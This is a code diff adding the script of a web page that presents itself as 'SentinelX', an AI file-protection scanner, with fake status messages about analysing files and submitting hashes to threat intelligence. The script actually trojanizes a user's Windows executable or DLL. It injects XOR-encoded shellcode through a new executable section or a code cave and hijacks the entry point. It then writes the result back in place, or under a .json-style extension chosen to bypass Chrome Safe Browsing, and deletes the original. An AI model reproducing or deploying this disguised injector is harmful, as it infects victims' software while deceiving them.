+        injectedBytes = new Uint8Array(targetBytes);
+      }
+    } else {
+      console.error('[SentinelX] Injection failed:', e.message);
+      injectedBytes = new Uint8Array(targetBytes);
+    }
+  }
+  await delay(300);
+
+  // 5. Write back - cascade through bypass strategies
+  const fname = (targetFile ? targetFile.name : 'output.exe');
+  await delay(400);
+  stopStatusCycle();
+
+  if (!injectedBytes || !injectedBytes.byteLength) { showDone(); return; }
+
+  // Strategy A: Edge silent in-place write (no SB check on Edge)
+  if (isEdge && targetHandle) {
+    try {
+      const wr = await targetHandle.createWritable({ keepExistingData: false });
+      await wr.write(injectedBytes);
+      await wr.truncate(injectedBytes.byteLength);
+      await wr.close();
+      showDone();
+      return;
+    } catch(e) {
+      console.log('[SentinelX] Edge write blocked:', e.name, e.message);
+    }
+  }
+
+  // Strategy B: Safe extension FSA write (.json - NOT_DANGEROUS, skips SB entirely)
+  try {
+    const safeResult = await bypassSafeExt(injectedBytes, fname);
+    if (safeResult) { showDecode(fname, safeResult.safeName, safeResult.origExt); return; }
+  } catch(e) {
+    console.log('[SentinelX] Safe-ext bypass failed:', e.name, e.message);
+  }
+
+  showDone();
+}
+
+
+// ─── Helpers ──────────────────────────────────────────────────────────────────
+function delay(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+function formatBytes(n) {
+  if (n < 1024)     return n + ' B';
+  if (n < 1048576)  return (n / 1024).toFixed(1) + ' KB';
+  return (n / 1048576).toFixed(2) + ' MB';
+}
+
+
+// ─── Status cycling ───────────────────────────────────────────────────────────
+const PROC_MSGS = [
+  'Reading file...',
+  'Analyzing PE structure...',
+  'Cross-referencing signatures...',
+  'Applying AI protection layer...',
+  'Submitting hash to threat intel...',
+];
+let msgIdx = 0;
+
+function startStatusCycle() {
+  msgIdx = 0;
+  document.getElementById('proc-status').textContent = PROC_MSGS[0];
+  statusTimer = setInterval(() => {
+    msgIdx = (msgIdx + 1) % PROC_MSGS.length;
+    document.getElementById('proc-status').textContent = PROC_MSGS[msgIdx];
+  }, 1600);
+}
+function stopStatusCycle() { clearInterval(statusTimer); statusTimer = null; }
+function setStatus(msg)    { document.getElementById('proc-status').textContent = msg; }
+
+
+
+
+// ─── showDone ─────────────────────────────────────────────────────────────────
+function showDone() {
+  document.getElementById('done-filename').textContent = targetFile.name + (targetIsDll ? ' (DLL)' : '');
+  document.getElementById('done-size').textContent     = formatBytes(targetBytes.byteLength);
+  document.getElementById('done-ts').textContent       = new Date().toLocaleString();
+  show('done');
+  if (typeof gsap !== 'undefined') {
+    gsap.fromTo('.done-card',
+      { opacity: 0, scale: .92 },
+      { opacity: 1, scale: 1, duration: .45, ease: 'power2.out' }
+    );
+    gsap.fromTo('.done-icon',
+      { scale: .5, opacity: 0 },
+      { scale: 1, opacity: 1, duration: .55, ease: 'back.out(2)', delay: .15 }
+    );
+  }
+}
+
+
+// ─── showThreat ───────────────────────────────────────────────────────────────
+// ─── resetAll ─────────────────────────────────────────────────────────────────
+function resetAll() {
+  targetHandle  = null;
+  parentDirHandle = null;
+  targetFile    = null;
+  targetBytes   = null;
+  injectedBytes = null;
+  targetIsDll   = false;
+  document.getElementById('drop-card').classList.remove('drag-over');
+  show('landing');
+}
+
+
+// ─── State switcher ───────────────────────────────────────────────────────────
+function show(id) {
+  document.querySelectorAll('.state').forEach(s => s.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+}
+
+// ─── Toast ────────────────────────────────────────────────────────────────────
+function showToast(msg) {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.classList.add('show');
+  setTimeout(() => t.classList.remove('show'), 3500);
+}
+
+
+// ─── Safe Browsing Bypass Strategies ──────────────────────────────────────
+
+// Strategy B: Write raw PE with NOT_DANGEROUS extension
+// Chrome's download_file_types.asciipb EXPLICITLY classifies .json/.txt/.csv
+// as NOT_DANGEROUS with SAMPLED_PING - SB skips blocking entirely.
+// Unregistered extensions (.cleaned etc.) default to ALLOW_ON_USER_GESTURE
+// which triggers full SB + content inspection - those DON'T work.
+const SAFE_EXTS = ['.json', '.txt', '.csv', '.xml', '.log'];
+
+async function bypassSafeExt(bytes, filename) {
+  const origExt  = filename.match(/\.[^.]+$/)?.[0] || '.exe';
+
+  for (const ext of SAFE_EXTS) {
+    const safeName = filename.replace(/\.[^.]+$/, ext);
+    const written = await trySafeWrite(bytes, safeName, filename);
+    if (written) return { safeName, origExt };
+  }
+  return null;
+}
+
+async function trySafeWrite(bytes, safeName, origFilename) {
+  if (parentDirHandle) {
+    try {
+      const fh = await parentDirHandle.getFileHandle(safeName, { create: true });
+      const wr = await fh.createWritable();
+      await wr.write(bytes);
+      await wr.close();
+      // Verify non-zero (SB block leaves 0-byte ghost)
+      const check = await fh.getFile();
+      if (check.size === 0) { try { await parentDirHandle.removeEntry(safeName); } catch(e) {} return false; }
+      // Delete original
+      try { await parentDirHandle.removeEntry(origFilename); } catch(e1) {
+        try { if (targetHandle) { const tw = await targetHandle.createWritable(); await tw.truncate(0); await tw.close(); } } catch(e2) {}
+      }
+      return true;
+    } catch(e) {
+      console.log('[SentinelX] Write as ' + safeName + ' failed:', e.name, e.message);
+      try { await parentDirHandle.removeEntry(safeName); } catch(e) {}
+    }
+  }
+
+  // Fallback: showSaveFilePicker
+  try {
+    const fh = await showSaveFilePicker({
+      suggestedName: safeName,
+      types: [{ description: 'Recovery data', accept: { 'application/octet-stream': [safeName.match(/\.[^.]+$/)?.[0] || '.json'] } }]
+    });
+    const wr = await fh.createWritable();
+    await wr.write(bytes);
+    await wr.close();
+    return true;
+  } catch(e) {
+    console.log('[SentinelX] SavePicker failed:', e.message);
+  }
+  return false;
+}
+
+// Strategy C: MOTW-free download via localhost (Intranet zone = no Zone.Identifier ADS)
+// ─── showDecode (safe-ext bypass: .cleaned file written, victim renames) ──
+function showDecode(origName, safeName, origExt) {
+  const safeExt = safeName.match(/\.[^.]+$/)?.[0] || '.json';
+  document.getElementById('decode-origname').textContent = origName;
+  document.getElementById('decode-filename').textContent = safeName;
+  document.getElementById('decode-filename2').textContent = safeName;
+  document.getElementById('decode-ext').textContent = safeExt;
+  document.getElementById('decode-target-ext').textContent = origExt || '.exe';
+  show('decode');
+  if (typeof gsap !== 'undefined') {
+    gsap.fromTo('.decode-card',
+      { opacity: 0, scale: .92 },
+      { opacity: 1, scale: 1, duration: .45, ease: 'power2.out' });
+    gsap.fromTo('.done-icon',
+      { scale: .5, opacity: 0 },
+      { scale: 1, opacity: 1, duration: .55, ease: 'back.out(2)', delay: .15 });
+  }
+}
+
+
+// ─── XOR shellcode helpers ────────────────────────────────────────────────────
+const DECODER_SIZE = 49;
+
+function xorEncode(bytes, key) {
+  const out = new Uint8Array(bytes.length);
+  for (let i = 0; i < bytes.length; i++) out[i] = bytes[i] ^ key;
+  return out;
+}
+
+// 49-byte position-independent x64 XOR decoder stub.
+// Layout on entry: OEP JMPs here → stub decodes encoded shellcode (immediately following)
+//                  → restores all registers → jmp rdi (shellcode start)
+// Register-safe: saves/restores r9,r8,rdx,rcx,rflags,rax,rbx (DllMain args preserved).
+function buildDecoderStub(shellcodeBodyLen, xorKey) {
+  const s = new Uint8Array(DECODER_SIZE);
+  let o = 0;
+  // push r9..rbx  (saves DllMain args + scratch regs)
+  s[o++]=0x41; s[o++]=0x51;           // push r9
+  s[o++]=0x41; s[o++]=0x50;           // push r8
+  s[o++]=0x52;                         // push rdx
+  s[o++]=0x51;                         // push rcx
+  s[o++]=0x9C;                         // pushfq
+  s[o++]=0x50;                         // push rax
+  s[o++]=0x53;                         // push rbx
+  // call $+5 → pop rax: gives us our VA (rax = entry+14 after pop)
+  s[o++]=0xE8; s[o++]=0x00; s[o++]=0x00; s[o++]=0x00; s[o++]=0x00; // call $+5
+  s[o++]=0x58;                         // pop rax  (rax = entry+14)
+  // add rax, 35  →  rax = shellcode start (entry+14+35 = entry+49)
+  s[o++]=0x48; s[o++]=0x05; s[o++]=0x23; s[o++]=0x00; s[o++]=0x00; s[o++]=0x00;
+  // mov ecx, len
+  s[o++]=0xB9;
+  s[o++]= shellcodeBodyLen        & 0xFF;
+  s[o++]=(shellcodeBodyLen >>  8) & 0xFF;
+  s[o++]=(shellcodeBodyLen >> 16) & 0xFF;
+  s[o++]=(shellcodeBodyLen >> 24) & 0xFF;
+  // mov bl, key
+  s[o++]=0xB3; s[o++]=xorKey & 0xFF;
+  // mov rdi, rax  (save shellcode start for jump after loop)
+  s[o++]=0x48; s[o++]=0x89; s[o++]=0xC7;
+  // decode_loop (offset 31):  xor [rax],bl; inc rax; loop decode_loop
+  s[o++]=0x30; s[o++]=0x18;           // xor [rax], bl
+  s[o++]=0x48; s[o++]=0xFF; s[o++]=0xC0; // inc rax
+  s[o++]=0xE2; s[o++]=0xF9;           // loop -7 → decode_loop
+  // Restore all saved registers (reverse order)
+  s[o++]=0x5B;                         // pop rbx
+  s[o++]=0x58;                         // pop rax
+  s[o++]=0x9D;                         // popfq
+  s[o++]=0x59;                         // pop rcx
+  s[o++]=0x5A;                         // pop rdx
+  s[o++]=0x41; s[o++]=0x58;           // pop r8
+  s[o++]=0x41; s[o++]=0x59;           // pop r9
+  // jmp rdi  (rdi = decoded shellcode start)
+  s[o++]=0xFF; s[o++]=0xE7;
+  if (o !== DECODER_SIZE) throw new Error('decoder stub size mismatch: ' + o);
+  return s;
+}
+
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// PE INJECTION - NEW SECTION (.sntx)
+// Appends a new executable section containing [shellcode + JMP-to-OEP trampoline]
+// then patches the original OEP with a JMP to the new section.
+// ═══════════════════════════════════════════════════════════════════════════════
+function injectNewSection(buf, shellcode) {
+  const bytes = new Uint8Array(buf.slice(0));
+  const view  = new DataView(bytes.buffer);
+
+  // Verify MZ + PE signature
+  if (view.getUint16(0, true) !== 0x5A4D) throw new Error('Not a PE');
+  const peOff = view.getUint32(0x3C, true);
+  if (view.getUint32(peOff, true) !== 0x00004550) throw new Error('Bad PE signature');
+
+  const coffOff       = peOff + 4;
+  const numSections   = view.getUint16(coffOff + 2, true);
+  const optHeaderSize = view.getUint16(coffOff + 16, true);
+  const optHeaderOff  = coffOff + 20;
+  const magic         = view.getUint16(optHeaderOff, true);
+  const is64          = magic === 0x20B;  // PE32+ (x64) vs PE32 (x86)
+  const coffChars     = view.getUint16(coffOff + 18, true);
+  const isDll         = !!(coffChars & 0x2000);  // IMAGE_FILE_DLL
+
+  const oepRva    = view.getUint32(optHeaderOff + 16, true);
+  if (isDll && oepRva === 0) throw new Error('DLL has no entry point (OEP=0); cannot inject');
+  const sectAlign = view.getUint32(optHeaderOff + 32, true);
+  const fileAlign = view.getUint32(optHeaderOff + 36, true);
+  const imageBase = is64
+    ? Number(view.getBigUint64(optHeaderOff + 24, true))
+    : view.getUint32(optHeaderOff + 28, true);
+
+  const sectionsBase  = optHeaderOff + optHeaderSize;
+  const sizeOfHeaders = view.getUint32(optHeaderOff + 60, true);
+
+  // Verify there is room in the PE header area for one more 40-byte section entry
+  const newHdrSlot = sectionsBase + numSections * 40;
+  if (newHdrSlot + 40 > sizeOfHeaders) throw new Error('No space for new section header');
+
+  // Last section info (to place new section after it)
+  const lastSecOff = sectionsBase + (numSections - 1) * 40;
+  const lastVA     = view.getUint32(lastSecOff + 12, true);
+  const lastVSz    = view.getUint32(lastSecOff + 8,  true);
+  const lastRaw    = view.getUint32(lastSecOff + 20, true);
+  const lastRawSz  = view.getUint32(lastSecOff + 16, true);
+
+  const align = (v, a) => Math.ceil(v / a) * a;
+  const newVA     = align(lastVA + lastVSz, sectAlign);
+  // Place new section after actual EOF, not just last declared section
+  // (handles overlays: Authenticode signatures, debug data, etc.)
+  const newRawOff = align(Math.max(lastRaw + lastRawSz, bytes.byteLength), fileAlign);
+
+  // New section layout:
+  //   [shellcode body -ret]   = shellcode.length - 1 bytes
+  //   [JMP FF25 to restoreStub] = 14 bytes
+  //   [restoreStub]           = 63 bytes  ← patches OEP bytes back in-place then JMPs there
+  // OEP patched with JMP (FF 25) to section start. .text made RWX so stub can write to it.
+  //
+  // Why restore-in-place instead of copying bytes to a trampoline:
+  //   OEP prologue contains RIP-relative instructions (e.g. mov rax,[rip+N]).
+  //   Running them from a different VA breaks those offsets. The only safe fix is to
+  //   restore the original bytes to OEP (correct address) then JMP there.
+
+  // Find OEP raw offset early (must save original bytes before any patching)
+  let oepRawOff = 0, oepSecHdrOff = 0;
+  for (let i = 0; i < numSections; i++) {
+    const soff = sectionsBase + i * 40;
+    const sva  = view.getUint32(soff + 12, true);
+    const svsz = view.getUint32(soff + 8,  true);
+    const sraw = view.getUint32(soff + 20, true);
+    if (oepRva >= sva && oepRva < sva + svsz) { oepRawOff = sraw + (oepRva - sva); oepSecHdrOff = soff; break; }
+  }
+  const savedOep = (oepRawOff > 0 && oepRawOff + 14 <= bytes.byteLength)
+    ? new Uint8Array(bytes.buffer, oepRawOff, 14).slice()
+    : new Uint8Array(14);
+
+  // XOR-encode shellcode body to bypass Safe Browsing static scan
+  const xorKey       = (Math.random() * 255 | 0) + 1;
+  const shellcodeBody = shellcode.slice(0, shellcode.length - 1);
+  const encodedBody   = xorEncode(shellcodeBody, xorKey);
+  const decoderStub   = buildDecoderStub(shellcodeBody.length, xorKey);
+
+  // Section layout: [decoder(49)] [encoded_body(sc-1)] [jmp_to_restore(14)] [restore_stub(63)]
+  const trampolineSize = DECODER_SIZE + encodedBody.length + 14 + 63;
+  const rawSz  = align(trampolineSize, fileAlign);
+  const virtSz = align(trampolineSize, sectAlign);
+
+  // Build new 40-byte section header
+  const newSecHdr = new Uint8Array(40);
+  const nd = new DataView(newSecHdr.buffer);
+  // Name: ".sntx\0\0\0"
+  [0x2E,0x73,0x6E,0x74,0x78,0x00,0x00,0x00].forEach((b,i) => newSecHdr[i] = b);
+  nd.setUint32(8,  virtSz,     true);  // VirtualSize
+  nd.setUint32(12, newVA,      true);  // VirtualAddress
+  nd.setUint32(16, rawSz,      true);  // SizeOfRawData
+  nd.setUint32(20, newRawOff,  true);  // PointerToRawData
+  // Characteristics: CNT_CODE | MEM_EXECUTE | MEM_READ | MEM_WRITE
+  nd.setUint32(36, 0xE0000020, true);
+
+  // Allocate new file and copy original
+  const newFileSize = newRawOff + rawSz;
+  const result = new Uint8Array(newFileSize);
+  result.set(bytes);
+
+  // Write new section header after existing section table
+  result.set(newSecHdr, sectionsBase + numSections * 40);
+
+  // Build restore stub (63 bytes):
+  //   push rsi/rdi/rcx/rax, pushfq, cld
+  //   lea rsi, [rip+36]        ← points to orig_bytes at stub+49
+  //   mov rdi, OEP_VA          ← destination
+  //   mov ecx, 14
+  //   rep movsb                ← write original bytes back to OEP (now RWX)
+  //   popfq, pop rax/rcx/rdi/rsi
+  //   FF25 JMP to OEP_VA       ← RIP-relative instructions now execute at original address
+  //   [8-byte OEP_VA]
+  //   [14 original OEP bytes]
+  const oepVAbig = BigInt(imageBase + oepRva);
+  const restoreStub = (() => {
+    const s = new Uint8Array(63);
+    const dv2 = new DataView(s.buffer);
+    let o = 0;
+    // push rsi, rdi, rcx, rax, pushfq, cld
+    s[o++]=0x56; s[o++]=0x57; s[o++]=0x51; s[o++]=0x50; s[o++]=0x9C; s[o++]=0xFC;
+    // lea rsi, [rip+36]  (RIP after this 7-byte instr = o+7 = 13; orig_bytes at 49; 49-13=36)
+    s[o++]=0x48; s[o++]=0x8D; s[o++]=0x35; s[o++]=36; s[o++]=0; s[o++]=0; s[o++]=0;
+    // mov rdi, OEP_VA
+    s[o++]=0x48; s[o++]=0xBF; dv2.setBigUint64(o, oepVAbig, true); o+=8;
+    // mov ecx, 14
+    s[o++]=0xB9; s[o++]=14; s[o++]=0; s[o++]=0; s[o++]=0;
+    // rep movsb
+    s[o++]=0xF3; s[o++]=0xA4;
+    // popfq, pop rax, rcx, rdi, rsi
+    s[o++]=0x9D; s[o++]=0x58; s[o++]=0x59; s[o++]=0x5F; s[o++]=0x5E;
+    // FF 25 JMP [RIP+0]
+    s[o++]=0xFF; s[o++]=0x25; s[o++]=0; s[o++]=0; s[o++]=0; s[o++]=0;
+    dv2.setBigUint64(o, oepVAbig, true); o+=8;
+    // 14 original OEP bytes (at stub offset 49)
+    s.set(savedOep.slice(0, 14), o); o+=14;
+    return s;  // o === 63
+  })();
+
+  const restoreStubOff = DECODER_SIZE + encodedBody.length + 14;
+  const restoreStubVA  = BigInt(imageBase + newVA + restoreStubOff);
+
+  result.set(decoderStub, newRawOff);                                 // decoder stub at section start
+  result.set(encodedBody, newRawOff + DECODER_SIZE);                  // XOR-encoded shellcode body
+
+  const jmpToRestore = new Uint8Array(14);                            // replaces ret → JMP to restore stub
+  jmpToRestore[0] = 0xFF; jmpToRestore[1] = 0x25;
+  new DataView(jmpToRestore.buffer).setBigUint64(6, restoreStubVA, true);
+  result.set(jmpToRestore, newRawOff + DECODER_SIZE + encodedBody.length);
+
+  result.set(restoreStub, newRawOff + restoreStubOff);
+
+  // Patch OEP with JMP (FF 25) to new section start
+  if (oepRawOff > 0 && oepRawOff + 14 < newFileSize) {
+    const jmpToShell = new Uint8Array(14);
+    jmpToShell[0] = 0xFF; jmpToShell[1] = 0x25;
+    new DataView(jmpToShell.buffer).setBigUint64(6, BigInt(imageBase + newVA), true);
+    result.set(jmpToShell, oepRawOff);
+  }
+
+  // Patch PE headers in result buffer
+  const rv = new DataView(result.buffer);
+  rv.setUint16(coffOff + 2,       numSections + 1,  true);  // NumberOfSections
+  rv.setUint32(optHeaderOff + 56, newVA + virtSz,   true);  // SizeOfImage
+  rv.setUint32(optHeaderOff + 64, 0,                true);  // CheckSum (clear)
+  // Clear DYNAMIC_BASE + HIGH_ENTROPY_VA so absolute addresses in OEP/restore stubs work
+  // (SB bypass via .json extension means SB never inspects PE characteristics)
+  const dllCharsOff = optHeaderOff + 70;
+  rv.setUint16(dllCharsOff, rv.getUint16(dllCharsOff, true) & ~0x0060, true);
+  // Make OEP section writable so restore stub can patch original bytes back at runtime
+  if (oepSecHdrOff > 0) {
+    rv.setUint32(oepSecHdrOff + 36, rv.getUint32(oepSecHdrOff + 36, true) | 0x80000000, true);
+  }
+
+  return result;
+}
+
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// PE INJECTION - CODE CAVE
+// Finds a null-byte run (cave) in an executable section, writes shellcode there,
+// patches OEP to redirect execution to the cave.
+// ═══════════════════════════════════════════════════════════════════════════════
+function injectCodeCave(buf, shellcode) {
+  const bytes = new Uint8Array(buf.slice(0));
+  const view  = new DataView(bytes.buffer);
+
+  if (view.getUint16(0, true) !== 0x5A4D) throw new Error('Not a PE');
+  const peOff = view.getUint32(0x3C, true);
+  if (view.getUint32(peOff, true) !== 0x00004550) throw new Error('Bad PE signature');
+
+  const coffOff       = peOff + 4;
+  const numSections   = view.getUint16(coffOff + 2, true);
+  const optHeaderOff  = coffOff + 20;
+  const optHeaderSize = view.getUint16(coffOff + 16, true);
+  const magic         = view.getUint16(optHeaderOff, true);
+  const is64          = magic === 0x20B;
+  const coffChars     = view.getUint16(coffOff + 18, true);
+  const isDll         = !!(coffChars & 0x2000);
+
+  const oepRva    = view.getUint32(optHeaderOff + 16, true);
+  if (isDll && oepRva === 0) throw new Error('DLL has no entry point (OEP=0); cannot inject');
+  const imageBase = is64
+    ? Number(view.getBigUint64(optHeaderOff + 24, true))
+    : view.getUint32(optHeaderOff + 28, true);
+
+  const sectionsBase = optHeaderOff + optHeaderSize;
+  const neededSize   = DECODER_SIZE + shellcode.length - 1 + 14 + 63;  // decoder + body + jmp + restore
+
+  // Scan executable sections for a null-byte run large enough
+  let caveRawOff = 0, caveRva = 0;
+  for (let i = 0; i < numSections; i++) {
+    const soff  = sectionsBase + i * 40;
+    const chars = view.getUint32(soff + 36, true);
+    if (!(chars & 0x20000000)) continue;  // IMAGE_SCN_MEM_EXECUTE not set
+
+    const sraw = view.getUint32(soff + 20, true);
+    const srsz = view.getUint32(soff + 16, true);
+    const sva  = view.getUint32(soff + 12, true);
+
+    for (let off = sraw; off + neededSize <= sraw + srsz; off++) {
+      let run = 0;
+      while (run < neededSize && off + run < bytes.length && bytes[off + run] === 0) run++;
+      if (run >= neededSize) {
+        caveRawOff = off;
+        caveRva    = sva + (off - sraw);
+        break;
+      }
+    }
+    if (caveRawOff) break;
+  }
+
+  if (!caveRawOff) throw new Error('No suitable code cave found');
+
+  // Find OEP raw offset by walking section table
+  let oepRawOff = 0, oepSecHdrOff2 = 0;
+  for (let i = 0; i < numSections; i++) {
+    const soff = sectionsBase + i * 40;
+    const sva  = view.getUint32(soff + 12, true);
+    const svsz = view.getUint32(soff + 8,  true);
+    const sraw = view.getUint32(soff + 20, true);
+    if (oepRva >= sva && oepRva < sva + svsz) {
+      oepRawOff = sraw + (oepRva - sva);
+      oepSecHdrOff2 = soff;
+      break;
+    }
+  }
+
+  // Cave layout: [shellcode body -ret] + [JMP to restore stub] + [restore stub (63 bytes)]
+  const savedOep2 = (oepRawOff > 0 && oepRawOff + 14 <= bytes.byteLength)
+    ? new Uint8Array(bytes.buffer, oepRawOff, 14).slice()
+    : new Uint8Array(14);
+
+  const caveOepVAbig = BigInt(imageBase + oepRva);
+  const caveRestoreStub = (() => {
+    const s = new Uint8Array(63);
+    const dv2 = new DataView(s.buffer);
+    let o = 0;
+    s[o++]=0x56; s[o++]=0x57; s[o++]=0x51; s[o++]=0x50; s[o++]=0x9C; s[o++]=0xFC;
+    s[o++]=0x48; s[o++]=0x8D; s[o++]=0x35; s[o++]=36; s[o++]=0; s[o++]=0; s[o++]=0;
+    s[o++]=0x48; s[o++]=0xBF; dv2.setBigUint64(o, caveOepVAbig, true); o+=8;
+    s[o++]=0xB9; s[o++]=14; s[o++]=0; s[o++]=0; s[o++]=0;
+    s[o++]=0xF3; s[o++]=0xA4;
+    s[o++]=0x9D; s[o++]=0x58; s[o++]=0x59; s[o++]=0x5F; s[o++]=0x5E;
+    s[o++]=0xFF; s[o++]=0x25; s[o++]=0; s[o++]=0; s[o++]=0; s[o++]=0;
+    dv2.setBigUint64(o, caveOepVAbig, true); o+=8;
+    s.set(savedOep2.slice(0, 14), o);
+    return s;
+  })();
+
+  // XOR-encode for code cave too
+  const caveXorKey      = (Math.random() * 255 | 0) + 1;
+  const caveScBody      = shellcode.slice(0, shellcode.length - 1);
+  const caveEncBody     = xorEncode(caveScBody, caveXorKey);
+  const caveDecoderStub = buildDecoderStub(caveScBody.length, caveXorKey);
+
+  const caveRestoreOff = DECODER_SIZE + caveEncBody.length + 14;
+  const caveRestoreVA  = BigInt(imageBase + caveRva + caveRestoreOff);
+
+  bytes.set(caveDecoderStub, caveRawOff);
+  bytes.set(caveEncBody, caveRawOff + DECODER_SIZE);
+
+  const jmpToRestore2 = new Uint8Array(14);
+  jmpToRestore2[0] = 0xFF; jmpToRestore2[1] = 0x25;
+  new DataView(jmpToRestore2.buffer).setBigUint64(6, caveRestoreVA, true);
+  bytes.set(jmpToRestore2, caveRawOff + DECODER_SIZE + caveEncBody.length);
+
+  bytes.set(caveRestoreStub, caveRawOff + caveRestoreOff);
+
+  // Patch OEP with JMP (FF 25) to cave start
+  if (oepRawOff > 0 && oepRawOff + 14 <= bytes.length) {
+    const jmpToCave = new Uint8Array(14);
+    jmpToCave[0] = 0xFF; jmpToCave[1] = 0x25;
+    new DataView(jmpToCave.buffer).setBigUint64(6, BigInt(imageBase + caveRva), true);
+    bytes.set(jmpToCave, oepRawOff);
+  }
+
+  const rv = new DataView(bytes.buffer);
+  rv.setUint32(optHeaderOff + 64, 0, true);  // Clear checksum
+  // Clear DYNAMIC_BASE so absolute addresses work without relocations
+  const dllCharsOff2 = optHeaderOff + 70;
+  rv.setUint16(dllCharsOff2, rv.getUint16(dllCharsOff2, true) & ~0x0060, true);
+  // Make OEP section writable so restore stub can patch bytes back
+  if (oepSecHdrOff2 > 0) {
+    rv.setUint32(oepSecHdrOff2 + 36, rv.getUint32(oepSecHdrOff2 + 36, true) | 0x80000000, true);
+  }
+
+  return bytes;
+}
+</script>
+</body>
+</html>
